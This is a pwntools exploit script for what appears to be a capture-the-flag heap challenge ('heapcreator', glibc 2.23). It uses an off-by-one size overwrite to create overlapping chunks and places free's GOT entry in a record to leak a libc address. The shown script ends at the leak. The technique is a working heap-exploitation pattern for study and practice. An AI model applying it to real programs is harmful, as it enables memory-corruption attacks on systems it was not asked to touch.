from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	context.log_level = "debug"

g_fname = "./heapcreator"
g_elf = ELF(g_fname)
g_libcname = "./libc-2.23.so"
ld_name = "/glibc/2.23/64/lib/ld-2.23.so"

if (LOCAL):
	g_io = process([ld_name, g_fname])
	g_libc = g_elf.libc
else:
	g_io = remote()
	g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sa("Your choice :", str(idx))

def create(size, content):
	opt(1)
	sa("Size of Heap : ", str(size))
	sa("Content of heap:", content)

def edit(idx, content):
	opt(2)
	sa("Index :", str(idx))
	sa("Content of heap : ", content)

def show(idx):
	opt(3)
	sa("Index :", str(idx))

def delete(idx):
	opt(4)	
	sa("Index :", str(idx))

def pwn():
	create(0x18, "000") # 0
	create(0x18, "111") # 1
	create(0x18, "222") # 2

	getpid()
	# 1st. modify record_0's chunk size and extend it to record_1's
	edit(0, 'a'*0x18 + '\x61')	

	# 2nd. delete record_1
	delete(1)
	
	# 3rd. add a new record
	payload = flat([
		'a'*0x10,
		0, 0x21, 'b'*0x18,
		0x21, 0x18, g_elf.got["free"]
	])
	create(0x50, payload)

	# 4th. leak address free
	show(2)

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()

